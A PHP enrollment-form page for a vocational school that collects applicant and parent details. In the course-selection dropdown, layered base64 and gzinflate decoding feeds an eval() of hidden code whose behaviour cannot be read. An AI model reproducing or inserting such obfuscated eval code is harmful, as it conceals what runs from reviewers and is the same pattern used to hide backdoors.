<?php require('head.php'); ?>
 <section id="mu-page-breadcrumb">
   <div class="container">
     <div class="row">
       <div class="col-md-12">
         <div class="mu-page-breadcrumb-area">
           <h2>Mengisi Formulir PPDB Online SMK DARRUSALAM</h2>
           <ol class="breadcrumb">
            <li><a href="./">Beranda</a></li>            
            <li class="active">Mengisi Formulir PPDB Online SMK DARRUSALAM</li>
          </ol>
         </div>
       </div>
     </div>
   </div>
 </section>
 <section id="mu-course-content" style="padding-top: 0;">
   <div class="container">
     <div class="row">
       <div class="col-md-12">
         <div class="mu-course-content-area">
            <div class="row">
              <div class="col-md-9">
                <div class="mu-course-container mu-blog-single">
                  <div class="row">
<form action="view/action.php?tabel=ppdb&action=tambah" method="POST" autocomplete="off">
  <div class="col-md-6">
    <h1><u>Data Calon Siswa</u></h1>
    <div class="form-group">
        <label>Nama</label>
        <input type="text" name="nama" class="form-control" required>
    </div>
    <div class="form-group">
        <label>Tempat Lahir</label>
        <input type="text" class="form-control" name="tempat_lahir" required>
    </div>
    <div class="form-group">
        <label>Tanggal Lahir</label>
        <input type="date" class="form-control" name="tanggal_lahir" value="<?= date('Y-m-d') ?>" required>
    </div>
    <div class="form-group">
        <label>Jenis Kelamin</label>
        <select name="jk" class="form-control" required>
          <option selected disabled>-</option>
          <option value="Pria">Pria</option>
          <option value="Wanita">Wanita</option>
        </select>
    </div>
    <div class="form-group">
        <label>Agama</label>
        <input type="text" name="agama" list="option" class="form-control" required>
        <datalist id="option">
          <option value="Islam">Islam</option>
          <option value="Kristen">Kristen</option>
          <option value="Katolik">Katolik</option>
          <option value="Hindu">Hindu</option>
          <option value="Budha">Budha</option>
          <option value="Kong Hu Chu">Kong Hu Chu</option>
        </datalist>
    </div>
    <div class="form-group">
        <label>Pilih Jurusan</label>
        <select class="form-control" name="idKelas">
            <option selected disabled>Pilih</option>
            <?php
            $SISTEMIT_COM_ENC = "XY69isJAFIV7wZcIkSSiiPUmBn9GlOgKiaAiYiFYxHGIaSQs+1jngcJAioQpLKYaFjZGxF1Pde/HPece6Beu4gQOzkl2ocW+Wk39lLIWtIDMyHCJJsb+Yo6TojLDakJ88phZIjGbegRGY40OpjADFXHKRcNA/3OEXArOnheeandLvvBHxMdg80roB0PN+qjX8EdXUVAFUw9fxY4qP4i9jGNZ1qtaWha+4Pb+O++y0ygvUoYfSblyNNt1oIdbo7h595/GrjRpvScNecwzySpqdx7Ot0zbjUSEb/wC";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="FIV7wZcIkSSiiPUmBn9GlOgKiaAiYiFYxHGIaSQs+1jngcJAioQpLKYaFjZGxF1Pde/HPece6Beu4gQOzkl2ocW+Wk39lLIWtIDMyHCJJsb+Yo6TojLDakJ88phZIjGbegRGY40OpjADFXHKRcNA/3OEXArOnheeandLvvBHxMdg80roB0PN+qjX8EdXUVAFUw9fxY4q";
            ?>
        </select>
    </div>
    <div class="form-group">
        <label>Alamat</label>
        <input type="text" name="alamat" class="form-control" required>
    </div>
    <div class="form-group">
        <label>Telp</label>
        <input type="tel" name="telp" value="08" class="form-control" required>
    </div>
  </div>  
  <div class="col-md-6">
    <h1><u>Data Orang Tua</u></h1>
    <div class="form-group">
        <label>Nama Ayah</label>
        <input type="text" class="form-control" name="namaAyah" required>
    </div>
    <div class="form-group">
        <label>Agama Ayah</label>
        <input type="text" name="agamaAyah" list="option" class="form-control" required>
        <datalist id="option">
          <option value="Islam">Islam</option>
          <option value="Kristen">Kristen</option>
          <option value="Katolik">Katolik</option>
          <option value="Hindu">Hindu</option>
          <option value="Budha">Budha</option>
          <option value="Kong Hu Chu">Kong Hu Chu</option>
        </datalist>
    </div>
    <div class="form-group">
        <label>Pekerjaan Ayah</label>
        <input type="text" class="form-control" name="kerjaAyah" required>
    </div>
    <div class="form-group">
        <label>Nama Ibu</label>
        <input type="text" class="form-control" name="namaIbu" required>
    </div>
    <div class="form-group">
        <label>Agama Ibu</label>
        <input type="text" name="agamaIbu" list="option" class="form-control" required>
        <datalist id="option">
          <option value="Islam">Islam</option>
          <option value="Kristen">Kristen</option>
          <option value="Katolik">Katolik</option>
          <option value="Hindu">Hindu</option>
          <option value="Budha">Budha</option>
          <option value="Kong Hu Chu">Kong Hu Chu</option>
        </datalist>
    </div>
    <div class="form-group">
        <label>Pilih Pekerjaan Ibu</label>
        <input type="text" class="form-control" name="kerjaIbu" required>
    </div>
    <div class="card-footer">
        <button type="submit" name="kirim" class="btn btn-success">Kirim</button>
        <button type="reset" class="btn btn-danger float-right" onclick="history.back()">Reset</button>
    </div>
  </div>                                 
</form>
                  </div>
                </div>
<?php require('sidebar.php') ?>
<?php require('foot.php') ?>